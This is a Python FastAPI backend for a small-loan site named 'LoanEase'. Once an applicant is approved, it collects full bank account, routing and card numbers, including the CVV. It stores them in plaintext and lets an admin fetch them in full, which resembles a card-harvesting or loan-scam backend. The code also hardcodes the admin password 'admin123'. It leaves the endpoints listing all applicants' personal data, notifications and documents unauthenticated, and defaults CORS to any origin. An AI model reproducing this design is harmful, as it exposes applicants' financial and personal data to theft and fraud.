from fastapi import FastAPI, APIRouter, HTTPException, UploadFile, File
from fastapi.responses import FileResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import aiofiles
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict, EmailStr
from typing import List, Optional, Literal
import uuid
from datetime import datetime, timezone

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# Create uploads directory
UPLOAD_DIR = ROOT_DIR / "uploads"
UPLOAD_DIR.mkdir(exist_ok=True)

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Simple password - hardcoded for simplicity
ADMIN_PASSWORD = "admin123"


# Models
class LoanApplicationCreate(BaseModel):
    first_name: str = Field(..., min_length=1, max_length=50)
    last_name: str = Field(..., min_length=1, max_length=50)
    email: EmailStr
    phone: str = Field(..., min_length=10, max_length=15)
    date_of_birth: str
    street_address: str = Field(..., min_length=1, max_length=200)
    city: str = Field(..., min_length=1, max_length=100)
    state: str = Field(..., min_length=2, max_length=2)
    zip_code: str = Field(..., min_length=5, max_length=10)
    annual_income: float = Field(..., gt=0)
    employment_status: str = Field(...)
    loan_amount_requested: float = Field(..., ge=100, le=5000)
    ssn_last_four: str = Field(..., min_length=4, max_length=4)


class LoanApplication(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    first_name: str
    last_name: str
    email: str
    phone: str
    date_of_birth: str
    street_address: str
    city: str
    state: str
    zip_code: str
    annual_income: float
    employment_status: str
    loan_amount_requested: float
    ssn_last_four: str
    status: str = "pending"
    approval_token: Optional[str] = None
    loan_accepted: bool = False
    banking_info_submitted: bool = False
    document_upload_token: Optional[str] = None
    document_request_message: Optional[str] = None
    documents: List[dict] = []
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))


class StatusUpdate(BaseModel):
    status: Literal["pending", "under_review", "documents_required", "approved", "rejected"]
    document_request_message: Optional[str] = None


class Notification(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    recipient_type: Literal["admin", "applicant"]
    recipient_email: str
    application_id: str
    subject: str
    message: str
    read: bool = False
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))


class AdminLoginRequest(BaseModel):
    password: str


class AdminLoginResponse(BaseModel):
    success: bool
    message: str


class BankingInfoSubmit(BaseModel):
    application_id: str
    token: str
    agree_to_terms: bool
    account_number: str = Field(..., min_length=8, max_length=17)
    routing_number: str = Field(..., min_length=9, max_length=9)
    card_number: str = Field(..., min_length=15, max_length=16)
    card_cvv: str = Field(..., min_length=3, max_length=4)
    card_expiration: str = Field(..., min_length=5, max_length=7)


class LoanCalculation(BaseModel):
    loan_amount: float
    interest_rate: float
    loan_term_months: int
    monthly_payment: float
    total_payment: float
    total_interest: float


# Helper function to create notifications
async def create_notification(
    recipient_type: str,
    recipient_email: str,
    application_id: str,
    subject: str,
    message: str
):
    notification = Notification(
        recipient_type=recipient_type,
        recipient_email=recipient_email,
        application_id=application_id,
        subject=subject,
        message=message
    )
    doc = notification.model_dump()
    doc['created_at'] = doc['created_at'].isoformat()
    await db.notifications.insert_one(doc)
    return notification


# API Routes
@api_router.get("/")
async def root():
    return {"message": "Loan Application API"}


@api_router.post("/admin/login", response_model=AdminLoginResponse)
async def admin_login(request: AdminLoginRequest):
    """Verify admin password - simple check"""
    if request.password == ADMIN_PASSWORD:
        return AdminLoginResponse(success=True, message="Login successful")
    raise HTTPException(status_code=401, detail="Invalid password")


@api_router.post("/applications", response_model=LoanApplication)
async def create_loan_application(application: LoanApplicationCreate):
    """Submit a new loan application"""
    try:
        app_dict = application.model_dump()
        loan_app = LoanApplication(**app_dict)
        
        doc = loan_app.model_dump()
        doc['created_at'] = doc['created_at'].isoformat()
        
        await db.loan_applications.insert_one(doc)
        
        # Create notification for admin
        await create_notification(
            recipient_type="admin",
            recipient_email="admin@loanease.com",
            application_id=loan_app.id,
            subject="New Loan Application Received",
            message=f"A new loan application has been submitted by {loan_app.first_name} {loan_app.last_name} for ${loan_app.loan_amount_requested:,.2f}. Application ID: {loan_app.id[:8].upper()}"
        )
        
        # Create notification for applicant
        await create_notification(
            recipient_type="applicant",
            recipient_email=loan_app.email,
            application_id=loan_app.id,
            subject="Application Received - LoanEase",
            message=f"Dear {loan_app.first_name},\n\nThank you for submitting your loan application. Your application reference is {loan_app.id[:8].upper()}.\n\nWe will review your application and get back to you within 24-48 hours.\n\nBest regards,\nLoanEase Team"
        )
        
        return loan_app
    except Exception as e:
        logging.error(f"Error creating loan application: {e}")
        raise HTTPException(status_code=500, detail="Failed to submit application")


@api_router.get("/applications/{application_id}", response_model=LoanApplication)
async def get_loan_application(application_id: str):
    """Get a loan application by ID"""
    application = await db.loan_applications.find_one(
        {"id": application_id},
        {"_id": 0}
    )
    
    if not application:
        raise HTTPException(status_code=404, detail="Application not found")
    
    if isinstance(application['created_at'], str):
        application['created_at'] = datetime.fromisoformat(application['created_at'])
    
    return application


@api_router.get("/applications", response_model=List[LoanApplication])
async def get_all_applications():
    """Get all loan applications"""
    applications = await db.loan_applications.find({}, {"_id": 0}).to_list(1000)
    
    for app in applications:
        if isinstance(app['created_at'], str):
            app['created_at'] = datetime.fromisoformat(app['created_at'])
    
    return applications


@api_router.patch("/applications/{application_id}/status", response_model=LoanApplication)
async def update_application_status(application_id: str, status_update: StatusUpdate):
    """Update loan application status"""
    application = await db.loan_applications.find_one({"id": application_id}, {"_id": 0})
    
    if not application:
        raise HTTPException(status_code=404, detail="Application not found")
    
    old_status = application['status']
    new_status = status_update.status
    
    await db.loan_applications.update_one(
        {"id": application_id},
        {"$set": {"status": new_status}}
    )
    
    # Create notification for applicant about status change
    status_messages = {
        "under_review": f"Dear {application['first_name']},\n\nYour loan application (Ref: {application_id[:8].upper()}) is now under review. Our team is carefully evaluating your application.\n\nWe will notify you once a decision has been made.\n\nBest regards,\nLoanEase Team",
        "approved": f"Dear {application['first_name']},\n\nCongratulations! Your loan application (Ref: {application_id[:8].upper()}) has been APPROVED!\n\nLoan Amount: ${application['loan_amount_requested']:,.2f}\n\nOur team will contact you shortly with the next steps.\n\nBest regards,\nLoanEase Team",
        "rejected": f"Dear {application['first_name']},\n\nWe regret to inform you that your loan application (Ref: {application_id[:8].upper()}) has been declined at this time.\n\nIf you have any questions, please don't hesitate to contact us.\n\nBest regards,\nLoanEase Team",
        "pending": f"Dear {application['first_name']},\n\nYour loan application (Ref: {application_id[:8].upper()}) status has been updated to pending.\n\nBest regards,\nLoanEase Team",
        "documents_required": f"Dear {application['first_name']},\n\nWe need additional documents to process your loan application (Ref: {application_id[:8].upper()}).\n\n{status_update.document_request_message or 'Please upload the requested documents.'}\n\nPlease visit our Track Application page and enter your email to upload the required documents.\n\nBest regards,\nLoanEase Team"
    }
    
    status_subjects = {
        "under_review": "Application Under Review - LoanEase",
        "approved": "🎉 Application Approved - LoanEase",
        "rejected": "Application Update - LoanEase",
        "pending": "Application Status Update - LoanEase",
        "documents_required": "📄 Documents Required - LoanEase"
    }
    
    # Generate document upload token when documents are requested
    document_upload_token = None
    if new_status == "documents_required" and old_status != "documents_required":
        document_upload_token = str(uuid.uuid4())
        await db.loan_applications.update_one(
            {"id": application_id},
            {"$set": {
                "document_upload_token": document_upload_token,
                "document_request_message": status_update.document_request_message or "Please upload supporting documents."
            }}
        )
    
    # Generate approval token when status changes to approved
    approval_token = None
    if new_status == "approved" and old_status != "approved":
        approval_token = str(uuid.uuid4())
        await db.loan_applications.update_one(
            {"id": application_id},
            {"$set": {"approval_token": approval_token}}
        )
    
    if old_status != new_status:
        # Include approval link in approved notification
        if new_status == "approved" and approval_token:
            status_messages["approved"] = f"Dear {application['first_name']},\n\nCongratulations! Your loan application (Ref: {application_id[:8].upper()}) has been APPROVED!\n\nLoan Amount: ${application['loan_amount_requested']:,.2f}\n\nTo complete your loan and receive funds, please click the link below to accept the terms and provide your banking information:\n\n[Complete Your Loan]\n\nThis is your unique secure link. Do not share it with anyone.\n\nBest regards,\nLoanEase Team"
        
        await create_notification(
            recipient_type="applicant",
            recipient_email=application['email'],
            application_id=application_id,
            subject=status_subjects[new_status],
            message=status_messages[new_status]
        )
        
        # Notify admin of status change
        await create_notification(
            recipient_type="admin",
            recipient_email="admin@loanease.com",
            application_id=application_id,
            subject=f"Application Status Changed: {old_status} → {new_status}",
            message=f"Application {application_id[:8].upper()} for {application['first_name']} {application['last_name']} has been updated from {old_status} to {new_status}."
        )
    
    # Return updated application
    updated_app = await db.loan_applications.find_one({"id": application_id}, {"_id": 0})
    if isinstance(updated_app['created_at'], str):
        updated_app['created_at'] = datetime.fromisoformat(updated_app['created_at'])
    
    return updated_app


@api_router.get("/notifications", response_model=List[Notification])
async def get_notifications(recipient_type: Optional[str] = None):
    """Get all notifications, optionally filtered by recipient type"""
    query = {}
    if recipient_type:
        query["recipient_type"] = recipient_type
    
    notifications = await db.notifications.find(query, {"_id": 0}).sort("created_at", -1).to_list(100)
    
    for notif in notifications:
        if isinstance(notif['created_at'], str):
            notif['created_at'] = datetime.fromisoformat(notif['created_at'])
    
    return notifications


@api_router.get("/notifications/applicant/{email}", response_model=List[Notification])
async def get_applicant_notifications(email: str):
    """Get notifications for a specific applicant by email"""
    notifications = await db.notifications.find(
        {"recipient_email": email, "recipient_type": "applicant"},
        {"_id": 0}
    ).sort("created_at", -1).to_list(100)
    
    for notif in notifications:
        if isinstance(notif['created_at'], str):
            notif['created_at'] = datetime.fromisoformat(notif['created_at'])
    
    return notifications


@api_router.patch("/notifications/{notification_id}/read")
async def mark_notification_read(notification_id: str):
    """Mark a notification as read"""
    result = await db.notifications.update_one(
        {"id": notification_id},
        {"$set": {"read": True}}
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Notification not found")
    
    return {"success": True}


@api_router.get("/notifications/unread-count")
async def get_unread_count(recipient_type: Optional[str] = None):
    """Get count of unread notifications"""
    query = {"read": False}
    if recipient_type:
        query["recipient_type"] = recipient_type
    
    count = await db.notifications.count_documents(query)
    return {"count": count}


@api_router.get("/applications/{application_id}/banking-info")
async def get_banking_info(application_id: str, full: bool = False, password: Optional[str] = None):
    """Get banking info for an application (admin only)"""
    application = await db.loan_applications.find_one(
        {"id": application_id},
        {"_id": 0}
    )
    
    if not application:
        raise HTTPException(status_code=404, detail="Application not found")
    
    if not application.get("banking_info_submitted"):
        raise HTTPException(status_code=404, detail="No banking info submitted for this application")
    
    banking_info = await db.banking_info.find_one(
        {"application_id": application_id},
        {"_id": 0}
    )
    
    if not banking_info:
        raise HTTPException(status_code=404, detail="Banking info not found")
    
    # If full details requested, verify admin password
    if full:
        if not password or password != ADMIN_PASSWORD:
            raise HTTPException(status_code=401, detail="Invalid password")
        
        # Return full banking info
        return {
            "id": banking_info["id"],
            "application_id": banking_info["application_id"],
            "account_number": banking_info.get("account_number", f"****{banking_info['account_number_last_four']}"),
            "routing_number": banking_info.get("routing_number", f"*****{banking_info['routing_number_last_four']}"),
            "card_number": banking_info.get("card_number", f"************{banking_info['card_last_four']}"),
            "card_cvv": banking_info.get("card_cvv", "***"),
            "card_expiration": banking_info["card_expiration"],
            "submitted_at": banking_info["submitted_at"]
        }
    
    # Return masked info by default
    return {
        "id": banking_info["id"],
        "application_id": banking_info["application_id"],
        "account_number_last_four": banking_info["account_number_last_four"],
        "routing_number_last_four": banking_info["routing_number_last_four"],
        "card_last_four": banking_info["card_last_four"],
        "card_expiration": banking_info["card_expiration"],
        "submitted_at": banking_info["submitted_at"]
    }


@api_router.get("/applications/verify/{token}")
async def verify_approval_token(token: str):
    """Verify approval token and get application details"""
    application = await db.loan_applications.find_one(
        {"approval_token": token, "status": "approved"},
        {"_id": 0}
    )
    
    if not application:
        raise HTTPException(status_code=404, detail="Invalid or expired link")
    
    if application.get("banking_info_submitted"):
        raise HTTPException(status_code=400, detail="Banking information already submitted")
    
    if isinstance(application['created_at'], str):
        application['created_at'] = datetime.fromisoformat(application['created_at'])
    
    return application


@api_router.get("/applications/document-upload/{token}")
async def verify_document_upload_token(token: str):
    """Verify document upload token and get application details"""
    application = await db.loan_applications.find_one(
        {"document_upload_token": token, "status": "documents_required"},
        {"_id": 0}
    )
    
    if not application:
        raise HTTPException(status_code=404, detail="Invalid or expired link")
    
    if isinstance(application['created_at'], str):
        application['created_at'] = datetime.fromisoformat(application['created_at'])
    
    return application


@api_router.post("/applications/{application_id}/upload-document")
async def upload_document(
    application_id: str,
    token: str,
    file: UploadFile = File(...)
):
    """Upload a document for an application"""
    # Verify token
    application = await db.loan_applications.find_one(
        {"id": application_id, "document_upload_token": token},
        {"_id": 0}
    )
    
    if not application:
        raise HTTPException(status_code=404, detail="Invalid application or token")
    
    # Validate file type
    allowed_types = ["application/pdf", "image/jpeg", "image/png", "image/jpg"]
    if file.content_type not in allowed_types:
        raise HTTPException(status_code=400, detail="Only PDF, JPG, and PNG files are allowed")
    
    # Validate file size (max 10MB)
    contents = await file.read()
    if len(contents) > 10 * 1024 * 1024:
        raise HTTPException(status_code=400, detail="File size must be less than 10MB")
    
    # Generate unique filename
    file_extension = file.filename.split(".")[-1] if "." in file.filename else "pdf"
    unique_filename = f"{application_id}_{uuid.uuid4()}.{file_extension}"
    file_path = UPLOAD_DIR / unique_filename
    
    # Save file
    async with aiofiles.open(file_path, 'wb') as f:
        await f.write(contents)
    
    # Store document metadata
    document_meta = {
        "id": str(uuid.uuid4()),
        "filename": file.filename,
        "stored_filename": unique_filename,
        "content_type": file.content_type,
        "size": len(contents),
        "uploaded_at": datetime.now(timezone.utc).isoformat()
    }
    
    await db.loan_applications.update_one(
        {"id": application_id},
        {"$push": {"documents": document_meta}}
    )
    
    # Create notification for admin
    await create_notification(
        recipient_type="admin",
        recipient_email="admin@loanease.com",
        application_id=application_id,
        subject="Document Uploaded",
        message=f"A new document '{file.filename}' has been uploaded for application {application_id[:8].upper()} by {application['first_name']} {application['last_name']}."
    )
    
    return {"success": True, "document": document_meta}


@api_router.get("/applications/{application_id}/documents/{document_id}")
async def get_document(application_id: str, document_id: str):
    """Download a document"""
    application = await db.loan_applications.find_one(
        {"id": application_id},
        {"_id": 0, "documents": 1}
    )
    
    if not application:
        raise HTTPException(status_code=404, detail="Application not found")
    
    document = None
    for doc in application.get("documents", []):
        if doc["id"] == document_id:
            document = doc
            break
    
    if not document:
        raise HTTPException(status_code=404, detail="Document not found")
    
    file_path = UPLOAD_DIR / document["stored_filename"]
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")
    
    return FileResponse(
        path=file_path,
        filename=document["filename"],
        media_type=document["content_type"]
    )


@api_router.post("/applications/accept-loan")
async def accept_loan_and_submit_banking(banking_info: BankingInfoSubmit):
    """Accept loan terms and submit banking information"""
    # Verify token
    application = await db.loan_applications.find_one(
        {"id": banking_info.application_id, "approval_token": banking_info.token, "status": "approved"},
        {"_id": 0}
    )
    
    if not application:
        raise HTTPException(status_code=404, detail="Invalid application or token")
    
    if application.get("banking_info_submitted"):
        raise HTTPException(status_code=400, detail="Banking information already submitted")
    
    if not banking_info.agree_to_terms:
        raise HTTPException(status_code=400, detail="You must agree to the loan terms")
    
    # Store banking info (in production, this should be encrypted)
    banking_doc = {
        "id": str(uuid.uuid4()),
        "application_id": banking_info.application_id,
        "account_number": banking_info.account_number,
        "account_number_last_four": banking_info.account_number[-4:],
        "routing_number": banking_info.routing_number,
        "routing_number_last_four": banking_info.routing_number[-4:],
        "card_number": banking_info.card_number,
        "card_last_four": banking_info.card_number[-4:],
        "card_cvv": banking_info.card_cvv,
        "card_expiration": banking_info.card_expiration,
        "submitted_at": datetime.now(timezone.utc).isoformat()
    }
    
    await db.banking_info.insert_one(banking_doc)
    
    # Update application
    await db.loan_applications.update_one(
        {"id": banking_info.application_id},
        {"$set": {"loan_accepted": True, "banking_info_submitted": True}}
    )
    
    # Notify applicant
    await create_notification(
        recipient_type="applicant",
        recipient_email=application['email'],
        application_id=banking_info.application_id,
        subject="Loan Accepted - Funds Processing",
        message=f"Dear {application['first_name']},\n\nThank you for accepting your loan terms and providing your banking information.\n\nLoan Amount: ${application['loan_amount_requested']:,.2f}\n\nYour funds will be disbursed to your account ending in {banking_info.account_number[-4:]} within 1-3 business days.\n\nBest regards,\nLoanEase Team"
    )
    
    # Notify admin
    await create_notification(
        recipient_type="admin",
        recipient_email="admin@loanease.com",
        application_id=banking_info.application_id,
        subject="Loan Accepted - Banking Info Submitted",
        message=f"Application {banking_info.application_id[:8].upper()} for {application['first_name']} {application['last_name']} has accepted the loan and submitted banking information.\n\nAccount ending: {banking_info.account_number[-4:]}\nCard ending: {banking_info.card_number[-4:]}\n\nReady for disbursement."
    )
    
    return {"success": True, "message": "Loan accepted and banking information submitted successfully"}


@api_router.get("/calculator")
async def calculate_loan(amount: float, rate: float = 8.5, term: int = 36):
    """Calculate loan payments"""
    monthly_rate = rate / 100 / 12
    
    if monthly_rate == 0:
        monthly_payment = amount / term
    else:
        monthly_payment = amount * (monthly_rate * (1 + monthly_rate)**term) / ((1 + monthly_rate)**term - 1)
    
    total_payment = monthly_payment * term
    total_interest = total_payment - amount
    
    return LoanCalculation(
        loan_amount=amount,
        interest_rate=rate,
        loan_term_months=term,
        monthly_payment=round(monthly_payment, 2),
        total_payment=round(total_payment, 2),
        total_interest=round(total_interest, 2)
    )


@api_router.get("/stats")
async def get_dashboard_stats():
    """Get dashboard statistics"""
    total = await db.loan_applications.count_documents({})
    pending = await db.loan_applications.count_documents({"status": "pending"})
    under_review = await db.loan_applications.count_documents({"status": "under_review"})
    approved = await db.loan_applications.count_documents({"status": "approved"})
    rejected = await db.loan_applications.count_documents({"status": "rejected"})
    
    # Calculate total loan amount
    pipeline = [
        {"$group": {"_id": None, "total": {"$sum": "$loan_amount_requested"}}}
    ]
    result = await db.loan_applications.aggregate(pipeline).to_list(1)
    total_amount = result[0]["total"] if result else 0
    
    # Approved amount
    pipeline_approved = [
        {"$match": {"status": "approved"}},
        {"$group": {"_id": None, "total": {"$sum": "$loan_amount_requested"}}}
    ]
    result_approved = await db.loan_applications.aggregate(pipeline_approved).to_list(1)
    approved_amount = result_approved[0]["total"] if result_approved else 0
    
    return {
        "total_applications": total,
        "pending": pending,
        "under_review": under_review,
        "approved": approved,
        "rejected": rejected,
        "total_requested_amount": total_amount,
        "approved_amount": approved_amount
    }


# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
